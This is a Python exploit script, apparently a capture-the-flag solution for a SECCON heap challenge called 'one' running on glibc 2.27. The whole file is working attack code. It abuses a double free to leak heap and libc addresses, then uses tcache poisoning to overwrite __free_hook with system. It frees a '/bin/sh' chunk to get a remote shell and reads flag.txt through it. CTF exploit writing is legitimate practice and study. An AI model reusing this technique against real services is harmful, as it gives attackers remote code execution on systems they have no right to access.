#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import os

bin_file = './one'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

default_host = {'host':'target', 'port':4296}

env = Environment('debug', 'local', 'remote', 'monitor')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET', monitor = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = default_host, \
                        monitor = {'host':os.environ['SECCON_HOST'], 'port':int(os.environ['SECCON_PORT'])} if 'SECCON_HOST' in os.environ else default_host)
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.27.so', \
                        monitor = 'libc-2.27.so')
env.select('monitor')

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

#==========

def attack(conn, **kwargs):
    one = One(conn)

    one.add('a'*8)
    one.add('b'*8)
    one.delete()
    one.delete()
    one.delete()
    one.delete()

    addr_heap_base = u(one.show()) - 0x12c0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    one.add(p64(addr_heap_base + 0x1260))
    one.add('b'*8)
    one.add(p64(0)+p64(0xa1)+p64(0))

    one.add('c'*8)
    one.delete()
    one.delete()

    one.add(p64(addr_heap_base + 0x1270))
    one.add('c'*8)
    one.add('A'*8)

    for _ in range(8):
        one.delete()

    addr_libc_mainarena = u(one.show()) - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.sep_function['system']
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    one.add('d'*8)
    one.delete()
    one.delete()

    one.add(p64(addr_libc_free_hook))
    one.add('A'*8)
    one.add(p64(addr_libc_system))

    one.add('/bin/sh')
    one.delete()

class One:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def add(self, data):
        self.sendlineafter('> ', '1')
        self.sendlineafter('memo > ', data)

    def show(self):
        self.sendlineafter('> ', '2')
        return self.recvuntil('\nDone', drop=True)

    def delete(self):
        self.sendlineafter('> ', '3')

def getflag(conn, **kwargs):
    sleep(0.1)
    conn.sendline('exec 2>&1')
    sleep(0.1)
    conn.sendline('echo FLAG_HERE; cat flag.txt')
    conn.recvuntil('FLAG_HERE\n')
    print 'FLAG : %s' % conn.recvuntil('\n', drop=True)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)

    if env.check('monitor'):
        comn.run(getflag)
    else:
        comn.connection.interactive()
    
#==========
